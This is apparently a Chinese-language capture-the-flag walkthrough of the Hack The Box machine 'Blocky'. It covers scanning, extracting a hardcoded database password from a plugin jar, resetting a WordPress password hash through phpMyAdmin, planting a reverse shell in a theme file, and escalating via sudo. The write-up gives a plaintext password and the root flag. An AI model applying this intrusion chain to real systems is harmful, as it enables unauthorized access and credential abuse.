## nmap

```Bash
21/tcp    open   ftp       ProFTPD 1.3.5a
22/tcp    open   ssh       OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)
|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)
|_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)
80/tcp    open   http      Apache httpd 2.4.18
|_http-title: Did not follow redirect to http://blocky.htb
|_http-server-header: Apache/2.4.18 (Ubuntu)
8192/tcp  closed sophos
25565/tcp open   minecraft Minecraft 1.11.2 (Protocol: 127, Message: A Minecraft Server, Users: 0/20)

```



## FTP

有匹配的版本poc

```Bash
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                             | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                                   | linux/remote/36803.py
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)                               | linux/remote/49908.py
ProFTPd 1.3.5 - File Copy                                                             | linux/remote/36742.txt

```

POC需要有php页面信息，github看下poc





## HTTP

web容器2.4.18 



### wp

login页面提示了wordpress，wpscan扫描下

```Bash
[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://blocky.htb/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://blocky.htb/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://blocky.htb/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://blocky.htb/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.8 identified (Insecure, released on 2017-06-08).
 | Found By: Rss Generator (Passive Detection)
 |  - http://blocky.htb/index.php/feed/, <generator>https://wordpress.org/?v=4.8</generator>
 |  - http://blocky.htb/index.php/comments/feed/, <generator>https://wordpress.org/?v=4.8</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://blocky.htb/wp-content/themes/twentyseventeen/
 | Last Updated: 2022-11-02T00:00:00.000Z
 | Readme: http://blocky.htb/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 3.1
 | Style URL: http://blocky.htb/wp-content/themes/twentyseventeen/style.css?ver=4.8
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://blocky.htb/wp-content/themes/twentyseventeen/style.css?ver=4.8, Match: 'Version: 1.3'

[+] Enumerating All Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:38:08 <==========================> (102274 / 102274) 100.00% Time: 00:38:08
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] akismet
 | Location: http://blocky.htb/wp-content/plugins/akismet/
 | Last Updated: 2022-12-01T17:18:00.000Z
 | Readme: http://blocky.htb/wp-content/plugins/akismet/readme.txt
 | [!] The version is out of date, the latest version is 5.0.2
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://blocky.htb/wp-content/plugins/akismet/, status: 200
 |
 | Version: 3.3.2 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://blocky.htb/wp-content/plugins/akismet/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://blocky.htb/wp-content/plugins/akismet/readme.txt

[+] Enumerating All Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:09:26 <============================> (25295 / 25295) 100.00% Time: 00:09:26
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] Theme(s) Identified:

[+] twentyfifteen
 | Location: http://blocky.htb/wp-content/themes/twentyfifteen/
 | Last Updated: 2022-11-02T00:00:00.000Z
 | Readme: http://blocky.htb/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 3.3
 | Style URL: http://blocky.htb/wp-content/themes/twentyfifteen/style.css
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen/
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://blocky.htb/wp-content/themes/twentyfifteen/, status: 500
 |
 | Version: 1.8 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://blocky.htb/wp-content/themes/twentyfifteen/style.css, Match: 'Version: 1.8'

[+] twentyseventeen
 | Location: http://blocky.htb/wp-content/themes/twentyseventeen/
 | Last Updated: 2022-11-02T00:00:00.000Z
 | Readme: http://blocky.htb/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 3.1
 | Style URL: http://blocky.htb/wp-content/themes/twentyseventeen/style.css
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Known Locations (Aggressive Detection)
 |  - http://blocky.htb/wp-content/themes/twentyseventeen/, status: 500
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://blocky.htb/wp-content/themes/twentyseventeen/style.css, Match: 'Version: 1.3'

[+] twentysixteen
 | Location: http://blocky.htb/wp-content/themes/twentysixteen/
 | Last Updated: 2022-11-02T00:00:00.000Z
 | Readme: http://blocky.htb/wp-content/themes/twentysixteen/readme.txt
 | [!] The version is out of date, the latest version is 2.8
 | Style URL: http://blocky.htb/wp-content/themes/twentysixteen/style.css
 | Style Name: Twenty Sixteen
 | Style URI: https://wordpress.org/themes/twentysixteen/
 | Description: Twenty Sixteen is a modernized take on an ever-popular WordPress layout — the horizontal masthead ...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://blocky.htb/wp-content/themes/twentysixteen/, status: 500
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://blocky.htb/wp-content/themes/twentysixteen/style.css, Match: 'Version: 1.3'

[+] Enumerating Timthumbs (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:57 <==============================> (2575 / 2575) 100.00% Time: 00:00:57

[i] No Timthumbs Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:03 <=================================> (137 / 137) 100.00% Time: 00:00:03

[i] No Config Backups Found.

[+] Enumerating DB Exports (via Passive and Aggressive Methods)
 Checking DB Exports - Time: 00:00:01 <=======================================> (71 / 71) 100.00% Time: 00:00:01

[i] No DB Exports Found.

[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to "Plain" for those to be detected)
 Brute Forcing Attachment IDs - Time: 00:00:02 <============================> (100 / 100) 100.00% Time: 00:00:02

[i] No Medias Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <==================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] notch
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://blocky.htb/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Notch
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Fri Feb 17 12:41:18 2023
[+] Requests Done: 130496
[+] Cached Requests: 46
[+] Data Sent: 33.819 MB
[+] Data Received: 17.835 MB
[+] Memory used: 447.406 MB
[+] Elapsed time: 00:49:03
```



wordpress版本4.8 

上传目录 [http://blocky.htb/wp-content/uploads/](http://blocky.htb/wp-content/uploads/)

有用的插件（需要通过readme或者changelog文件确认真实版本，直接扫出来的可能是假的）：akismet 3.3.2 该插件在exploitdb上只有两个xss，忽略

更多的可能性还是要先拿到wp的用户名密码，这里没有猜username的信息，爆破难度比较大，先找找其他端口

目录爆破，状态码异常，忽略掉。



这里犯了一个严重错误，已经知道web访问是用域名的，但实际扫描中还用了IP，导致扫不出东西来，很多重要信息没有获取到。 

```Bash
/index.php            (Status: 301) [Size: 0] [--> http://blocky.htb/]
/wiki                 (Status: 301) [Size: 307] [--> http://blocky.htb/wiki/]
/wp-content           (Status: 301) [Size: 313] [--> http://blocky.htb/wp-content/]
/wp-login.php         (Status: 200) [Size: 2397]
/plugins              (Status: 301) [Size: 310] [--> http://blocky.htb/plugins/]
/license.txt          (Status: 200) [Size: 19935]
/wp-includes          (Status: 301) [Size: 314] [--> http://blocky.htb/wp-includes/]
/readme.html          (Status: 200) [Size: 7413]
/javascript           (Status: 301) [Size: 313] [--> http://blocky.htb/javascript/]
/wp-trackback.php     (Status: 200) [Size: 135]
/wp-admin             (Status: 301) [Size: 311] [--> http://blocky.htb/wp-admin/]
/phpmyadmin           (Status: 301) [Size: 313] [--> http://blocky.htb/phpmyadmin/]
/xmlrpc.php           (Status: 405) [Size: 42]
/wp-signup.php        (Status: 302) [Size: 0] [--> http://blocky.htb/wp-login.php?action=register]
/server-status        (Status: 403) [Size: 298]

```

/plugins里面有两个jar包，其余目录没有发现有用信息，解压缩jar包

blockycore.class中包含了一个疑似账号信息

```Bash

└─# strings BlockyCore.class
com/myfirstplugin/BlockyCore
java/lang/Object
sqlHost
Ljava/lang/String;
sqlUser
sqlPass
<init>
Code
        localhost
root
8YsqfCTnvxAUeduzjNSXe22
LineNumberTable
LocalVariableTable
this
Lcom/myfirstplugin/BlockyCore;
onServerStart
onServerStop
onPlayerJoin
TODO get username
!Welcome to the BlockyCraft!!!!!!!
sendMessage
'(Ljava/lang/String;Ljava/lang/String;)V
username
message
SourceFile
BlockyCore.java
```

rss中有一个用户名Notch

```Bash
└─# strings SENwpbBV
<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
        xmlns:content="http://purl.org/rss/1.0/modules/content/"
        xmlns:wfw="http://wellformedweb.org/CommentAPI/"
        xmlns:dc="http://purl.org/dc/elements/1.1/"
        xmlns:atom="http://www.w3.org/2005/Atom"
        xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
        xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
<channel>
        <title>BlockyCraft</title>
        <atom:link href="http://blocky.htb/index.php/feed/" rel="self" type="application/rss+xml" />
        <link>http://blocky.htb</link>
        <description>Under Construction!</description>
        <lastBuildDate>Mon, 03 Jul 2017 00:28:31 +0000</lastBuildDate>
        <language>en-US</language>
        <sy:updatePeriod>hourly</sy:updatePeriod>
        <sy:updateFrequency>1</sy:updateFrequency>
        <generator>https://wordpress.org/?v=4.8</generator>
        <item>
                <title>Welcome to BlockyCraft!</title>
                <link>http://blocky.htb/index.php/2017/07/02/welcome-to-blockycraft/</link>
                <comments>http://blocky.htb/index.php/2017/07/02/welcome-to-blockycraft/#respond</comments>
                <pubDate>Sun, 02 Jul 2017 23:51:05 +0000</pubDate>
                <dc:creator><![CDATA[Notch]]></dc:creator>
                                <category><![CDATA[Uncategorized]]></category>
                <guid isPermaLink="false">http://192.168.2.70/?p=5</guid>
                <description><![CDATA[Welcome everyone. The site and server are still under construction so don&#8217;t expect too much right now! We are currently developing a wiki system for the server and a core plugin to track player stats and stuff. Lots of great stuff planned for the future
]]></description>
                                <content:encoded><![CDATA[<p>Welcome everyone. The site and server are still under construction so don&#8217;t expect too much right now!</p>
<p>We are currently developing a wiki system for the server and a core plugin to track player stats and stuff. Lots of great stuff planned for the future <img src="https://s.w.org/images/core/emoji/2.3/72x72/1f642.png" alt="
" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
]]></content:encoded>
                        <wfw:commentRss>http://blocky.htb/index.php/2017/07/02/welcome-to-blockycraft/feed/</wfw:commentRss>
                <slash:comments>0</slash:comments>
                </item>
        </channel>
</rss>
```



用上面的root账号登录phpmyadmin，获得另外的账号和散列密码 

![](https://secure2.wostatic.cn/static/vVqsioPNHje8orJYXwAwFq/image.png?auth_key=1677500694-sot2q4XjjrYpHuvwLve5Ad-0-56b6010b4355ddcd064c50502eeb8778)



这里没有直接的phpmyadmin漏洞，需要在里面修改North的面，自己用md5创建一个，这里echo没有加-n选项，没有忽略后面的\n导致实际的都的md5并不是纯字符串

```Bash
└─# echo "thisboxisshit" | md5sum   # 错误用法
74a0a478460d6fc551886df7a34c38eb  -

┌──(root㉿walle)-[/home/machines/linux/blocky] # 正确用法
└─# echo -n 'thisboxisshit' | md5sum
fbaf995404f549e4535a2e3eea09f577  -

```

![](https://secure2.wostatic.cn/static/4baRgeVS1aNBipzP61xH3A/image.png?auth_key=1677500694-qC2rp9Bj64EkyFMF66bp71-0-24ef5160dad5ff5dec4de117ee1de815)



登录wordpress，将404.php 修改成一个反弹shell

![](https://secure2.wostatic.cn/static/fJs73J3DX3iWTeSiWPGiFn/image.png?auth_key=1677500694-m4GvL5YgmX99bZYmWe2MoY-0-dbbae135b592f48a59cb241feddabae9)



访问一个不存在的网页，这里一定要访问 /index.php/sdjfkd  尝试其他目录都不能触发

![](https://secure2.wostatic.cn/static/ckTx7mmuAVyG4hangd6jsQ/image.png?auth_key=1677500694-9AETJXFfL5bqCBw2RbKngL-0-9c6042b45293618def34e86eb2e7b41d)

这里拿到的www-data，无法查看user.txt  需要先提权到notch用户



## ssh

上面那个root密码不仅是phpmyadmin的登录账户，还是notch的ssh密码，可以直接拿到user.txt





## privilege escalation

### www-data → notch

在notch的家目录中查找有用信息





### notch → root

#### pkexec 

靶机没有装make

#### LinEnum

```Bash
# 比较可疑之处
有个cron
@reboot cd /home/notch/minecraft && ./start.sh  # @reboot用于在服务器启动的时候执行，貌似在这里没有什么用


notch@Blocky:~/minecraft$ cat start.sh
if ! screen -list | grep blockycraft > /dev/null
then
        screen -dmS blockycraft java -Xms500M -Xmx500M -jar ./sponge.jar nogui
fi



# 发现有screen相关但是为detached
notch@Blocky:~/minecraft$ screen -ls
There is a screen on:
        1187.blockycraft        (02/16/2023 09:15:10 PM)        (Detached)
1 Socket in /var/run/screen/S-notch.

# 有进程和java相关
notch@Blocky:~/minecraft$ ps -ef | grep java
notch      1187      1  0 Feb16 ?        00:00:01 SCREEN -dmS blockycraft java -Xms500M -Xmx500M -jar ./sponge.jar nogui
notch      1199   1187  1 Feb16 pts/0    00:08:07 java -Xms500M -Xmx500M -jar ./sponge.jar nogui


```



强制attach后，session被结束掉了， 手动拉起来

```Bash
notch@Blocky:~/minecraft$ screen -r 1187.blockycraft
There is no screen to be resumed matching 1187.blockycraft.
notch@Blocky:~/minecraft$
notch@Blocky:~/minecraft$
notch@Blocky:~/minecraft$ screen -ls
No Sockets found in /var/run/screen/S-notch.

notch@Blocky:~/minecraft$ screen -dmS blockycraft java -Xms500M -Xmx500M -jar ./sponge.jar nogui
notch@Blocky:~/minecraft$
notch@Blocky:~/minecraft$
notch@Blocky:~/minecraft$
notch@Blocky:~/minecraft$ screen -ls
There is a screen on:
        29209.blockycraft       (02/17/2023 09:40:02 AM)        (Detached)
1 Socket in /var/run/screen/S-notch.
notch@Blocky:~/minecraft$
notch@Blocky:~/minecraft$
notch@Blocky:~/minecraft$ screen -r 29209.blockycraft
```

进入了Minecraft的命令控制台

![](https://secure2.wostatic.cn/static/21DjywX42YBRDihqhMNKKa/image.png?auth_key=1677500694-9ocu29auPMD5TWmbj9JVn7-0-f59a05034e9f2656de8d6716e2f4458d)

没发现有什么用



#### sudo

非常扯淡的一种场景

```Bash
notch@Blocky:~$ sudo -l
[sudo] password for notch:
Matching Defaults entries for notch on Blocky:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User notch may run the following commands on Blocky:
    (ALL : ALL) ALL
notch@Blocky:~$ sudo id
uid=0(root) gid=0(root) groups=0(root)
notch@Blocky:~$ sudo cat /root/root.txt
c9d4e265fc179b84b4bdaee0dc944a23

```
